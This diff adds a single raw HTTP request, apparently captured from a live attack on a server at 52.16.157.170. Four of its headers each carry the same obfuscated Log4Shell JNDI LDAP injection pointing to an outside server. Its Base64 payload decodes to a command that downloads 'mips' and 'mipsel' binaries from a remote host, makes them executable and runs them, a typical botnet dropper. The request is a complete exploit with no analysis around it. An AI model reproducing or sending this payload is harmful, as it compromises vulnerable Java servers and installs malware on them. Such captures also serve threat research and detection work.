@@ -1,0 +1,8 @@
+ÎGET /root/proxies/http.txt HTTP/1.1
+X-Api-Version: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//185.145.202.146:1389/Basic/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwczsgY2htb2QgNzc3IG1pcHM7IC4vbWlwczsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwc2VsOyBjaG1vZCA3NzcgbWlwc2VsOyAuL21pcHNlbA==}')
+User-Agent: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//185.145.202.146:1389/Basic/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwczsgY2htb2QgNzc3IG1pcHM7IC4vbWlwczsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwc2VsOyBjaG1vZCA3NzcgbWlwc2VsOyAuL21pcHNlbA==}')
+Referer: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//185.145.202.146:1389/Basic/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwczsgY2htb2QgNzc3IG1pcHM7IC4vbWlwczsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwc2VsOyBjaG1vZCA3NzcgbWlwc2VsOyAuL21pcHNlbA==}')
+Cookie: t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//185.145.202.146:1389/Basic/Command/Base64/Y2QgL3RtcDsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwczsgY2htb2QgNzc3IG1pcHM7IC4vbWlwczsgd2dldCBodHRwOi8vMjEyLjE5My4zMC4xMDcvbWlwc2VsOyBjaG1vZCA3NzcgbWlwc2VsOyAuL21pcHNlbA==}')
+host: 52.16.157.170
+Connection: close
+
